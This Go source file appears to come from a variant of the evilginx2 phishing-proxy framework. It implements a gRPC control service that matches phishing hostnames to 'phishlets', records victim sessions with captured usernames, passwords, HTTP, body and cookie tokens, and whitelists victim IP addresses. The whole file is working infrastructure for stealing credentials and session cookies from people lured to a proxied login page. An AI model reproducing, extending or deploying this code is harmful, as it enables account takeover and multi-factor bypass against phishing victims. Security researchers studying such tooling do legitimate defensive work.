package control

import (
	"context"
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/core"
	"github.com/kgretzky/evilginx2/internal/storage"
	"github.com/kgretzky/evilginx2/log"
	"github.com/kgretzky/evilginx2/pkg/models"
	"github.com/kgretzky/evilginx2/proto"
	"google.golang.org/grpc"
)

type ControlService struct {
	proto.UnimplementedProxyControlServiceServer
	storage      storage.Interface
	config       *models.Config
	sessions     map[string]*models.Session
	phishlets    map[string]*models.Phishlet
	ipWhitelist  map[string]int64
	ipSids       map[string]string
	sessionMtx   sync.RWMutex
	ipMtx        sync.RWMutex
	grpcServer   *grpc.Server
}

func NewControlService(storage storage.Interface, config *models.Config) *ControlService {
	return &ControlService{
		storage:     storage,
		config:      config,
		sessions:    make(map[string]*models.Session),
		phishlets:   make(map[string]*models.Phishlet),
		ipWhitelist: make(map[string]int64),
		ipSids:      make(map[string]string),
	}
}

func (s *ControlService) StartGRPCServer(port string) error {
	lis, err := net.Listen("tcp", ":"+port)
	if err != nil {
		return fmt.Errorf("failed to listen on port %s: %w", port, err)
	}

	s.grpcServer = grpc.NewServer()
	proto.RegisterProxyControlServiceServer(s.grpcServer, s)

	log.Info("Starting gRPC control service on port %s", port)
	return s.grpcServer.Serve(lis)
}

func (s *ControlService) Stop() {
	if s.grpcServer != nil {
		s.grpcServer.GracefulStop()
	}
}

func (s *ControlService) GetPhishletByHost(ctx context.Context, req *proto.GetPhishletRequest) (*proto.GetPhishletResponse, error) {
	s.sessionMtx.RLock()
	defer s.sessionMtx.RUnlock()

	for _, phishlet := range s.phishlets {
		if !phishlet.IsEnabled {
			continue
		}

		for _, ph := range phishlet.ProxyHosts {
			var targetHost string
			if req.IsPhishHost {
				targetHost = s.combineHost(ph.PhishSubdomain, phishlet.Hostname)
			} else {
				targetHost = s.combineHost(ph.OrigSubdomain, ph.Domain)
			}

			if req.Hostname == targetHost {
				return &proto.GetPhishletResponse{
					Found:           true,
					Phishlet:        s.convertPhishletToProto(phishlet),
					PhishDomain:     phishlet.Hostname,
					PhishSubdomain:  ph.PhishSubdomain,
				}, nil
			}
		}
	}

	return &proto.GetPhishletResponse{Found: false}, nil
}

func (s *ControlService) ValidateSession(ctx context.Context, req *proto.ValidateSessionRequest) (*proto.ValidateSessionResponse, error) {
	s.sessionMtx.RLock()
	defer s.sessionMtx.RUnlock()

	for _, phishlet := range s.phishlets {
		if !phishlet.IsEnabled {
			continue
		}

		for _, ph := range phishlet.ProxyHosts {
			phishHost := s.combineHost(ph.PhishSubdomain, phishlet.Hostname)
			if req.Hostname == phishHost {
				return &proto.ValidateSessionResponse{ShouldHandle: true}, nil
			}
		}
	}

	return &proto.ValidateSessionResponse{ShouldHandle: false}, nil
}

func (s *ControlService) CreateSession(ctx context.Context, req *proto.CreateSessionRequest) (*proto.CreateSessionResponse, error) {
	session := &models.Session{
		ID:           req.SessionId,
		PhishletName: req.PhishletName,
		LandingURL:   req.LandingUrl,
		UserAgent:    req.UserAgent,
		RemoteAddr:   req.RemoteAddr,
		Custom:       make(map[string]string),
		BodyTokens:   make(map[string]string),
		HttpTokens:   make(map[string]string),
		CookieTokens: make(map[string]map[string]*models.CookieToken),
		CreateTime:   time.Now().UTC(),
		UpdateTime:   time.Now().UTC(),
		IsActive:     true,
	}

	if err := s.storage.CreateSession(ctx, session); err != nil {
		return &proto.CreateSessionResponse{
			Success: false,
			Error:   err.Error(),
		}, nil
	}

	s.sessionMtx.Lock()
	s.sessions[session.ID] = session
	s.sessionMtx.Unlock()

	return &proto.CreateSessionResponse{Success: true}, nil
}

func (s *ControlService) UpdateSession(ctx context.Context, req *proto.UpdateSessionRequest) (*proto.UpdateSessionResponse, error) {
	s.sessionMtx.Lock()
	defer s.sessionMtx.Unlock()

	session, exists := s.sessions[req.SessionId]
	if !exists {
		return &proto.UpdateSessionResponse{
			Success: false,
			Error:   "session not found",
		}, nil
	}

	if req.Username != "" {
		session.Username = req.Username
	}
	if req.Password != "" {
		session.Password = req.Password
	}
	if req.Custom != nil {
		for k, v := range req.Custom {
			session.Custom[k] = v
		}
	}
	if req.BodyTokens != nil {
		for k, v := range req.BodyTokens {
			session.BodyTokens[k] = v
		}
	}
	if req.HttpTokens != nil {
		for k, v := range req.HttpTokens {
			session.HttpTokens[k] = v
		}
	}

	session.UpdateTime = time.Now().UTC()

	if err := s.storage.UpdateSession(ctx, session); err != nil {
		return &proto.UpdateSessionResponse{
			Success: false,
			Error:   err.Error(),
		}, nil
	}

	return &proto.UpdateSessionResponse{Success: true}, nil
}

func (s *ControlService) IsWhitelistedIP(ctx context.Context, req *proto.WhitelistRequest) (*proto.WhitelistResponse, error) {
	s.ipMtx.RLock()
	defer s.ipMtx.RUnlock()

	key := req.IpAddr + "-" + req.PhishletName
	if expiry, exists := s.ipWhitelist[key]; exists {
		if time.Now().Unix() < expiry {
			return &proto.WhitelistResponse{IsWhitelisted: true}, nil
		}
		delete(s.ipWhitelist, key)
		delete(s.ipSids, key)
	}

	return &proto.WhitelistResponse{IsWhitelisted: false}, nil
}

func (s *ControlService) GetSessionIdByIP(ctx context.Context, req *proto.GetSessionIdRequest) (*proto.GetSessionIdResponse, error) {
	s.ipMtx.RLock()
	defer s.ipMtx.RUnlock()

	phishletResp, err := s.GetPhishletByHost(ctx, &proto.GetPhishletRequest{
		Hostname:    req.Hostname,
		IsPhishHost: true,
	})
	if err != nil || !phishletResp.Found {
		return &proto.GetSessionIdResponse{Found: false}, nil
	}

	key := req.IpAddr + "-" + phishletResp.Phishlet.Name
	if sid, exists := s.ipSids[key]; exists {
		return &proto.GetSessionIdResponse{
			Found:     true,
			SessionId: sid,
		}, nil
	}

	return &proto.GetSessionIdResponse{Found: false}, nil
}

func (s *ControlService) WhitelistIP(ctx context.Context, req *proto.WhitelistIPRequest) (*proto.WhitelistIPResponse, error) {
	s.ipMtx.Lock()
	defer s.ipMtx.Unlock()

	key := req.IpAddr + "-" + req.PhishletName
	s.ipWhitelist[key] = time.Now().Add(10 * time.Minute).Unix()
	s.ipSids[key] = req.SessionId

	log.Debug("Whitelisted IP: %s for phishlet: %s", req.IpAddr, req.PhishletName)

	return &proto.WhitelistIPResponse{Success: true}, nil
}

func (s *ControlService) LoadPhishlets(ctx context.Context) error {
	phishlets, err := s.storage.ListPhishlets(ctx, nil)
	if err != nil {
		return err
	}

	s.sessionMtx.Lock()
	defer s.sessionMtx.Unlock()

	for _, phishlet := range phishlets {
		s.phishlets[phishlet.Name] = phishlet
	}

	log.Info("Loaded %d phishlets", len(phishlets))
	return nil
}

func (s *ControlService) LoadSessions(ctx context.Context) error {
	sessions, err := s.storage.ListSessions(ctx, nil)
	if err != nil {
		return err
	}

	s.sessionMtx.Lock()
	defer s.sessionMtx.Unlock()

	for _, session := range sessions {
		s.sessions[session.ID] = session
	}

	log.Info("Loaded %d sessions", len(sessions))
	return nil
}

func (s *ControlService) convertPhishletToProto(phishlet *models.Phishlet) *proto.Phishlet {
	protoPhishlet := &proto.Phishlet{
		Name:        phishlet.Name,
		Author:      phishlet.Author,
		RedirectUrl: phishlet.RedirectURL,
		IsTemplate:  phishlet.IsTemplate,
		ProxyHosts:  make([]*proto.ProxyHost, len(phishlet.ProxyHosts)),
	}

	for i, ph := range phishlet.ProxyHosts {
		protoPhishlet.ProxyHosts[i] = &proto.ProxyHost{
			PhishSubdomain: ph.PhishSubdomain,
			OrigSubdomain:  ph.OrigSubdomain,
			Domain:         ph.Domain,
			HandleSession:  ph.HandleSession,
			IsLanding:      ph.IsLanding,
			AutoFilter:     ph.AutoFilter,
		}
	}

	return protoPhishlet
}

func (s *ControlService) combineHost(subdomain, domain string) string {
	if subdomain == "" {
		return domain
	}
	return subdomain + "." + domain
}
